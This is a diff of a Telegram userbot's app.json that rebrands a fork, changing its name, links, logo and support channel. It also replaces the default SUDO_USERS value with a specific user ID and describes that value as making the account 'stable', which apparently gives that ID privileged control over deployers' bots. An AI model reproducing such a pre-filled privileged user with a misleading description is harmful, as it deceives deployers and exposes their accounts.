@@ -1,7 +1,7 @@
 {
-  "name": "IndianBot",
-  "description": "Userbot created by a IndianBhai and join https://t.me/IndianArMyGiveaway for any problems or support",
-  "logo": "https://telegra.ph/file/a79203c2aba1c0a2aeeb7.jpg",
+  "name": "ShadowNinja_Robot",
+  "description": "Userbot created by a Shadow Ninja and join https://t.me/shadowninjaproofs for any problems , support or buying ",
+  "logo": "https://telegra.ph/file/dc431339f647e35588287.jpg",
     "keywords": [
     "telegram",
     "userbot",
@@ -9,7 +9,7 @@
     "modular",
     "productivity"
   ],
-  "repository": "https://github.com/indianbhaiya/IndianBot/",
+  "repository": "https://github.com/shadowninja024/ShadowNinja_Robot/",
   "website": "#TODO",
   "success_url": "#TODO",
   "env": {
@@ -80,7 +80,7 @@
     },
     "SUDO_USERS": {
       "description": "Makes your acc and bot stable",
-      "value": "953414679",
+      "value": "709096827",
       "required": false
     },
     "CHROME_BIN": {
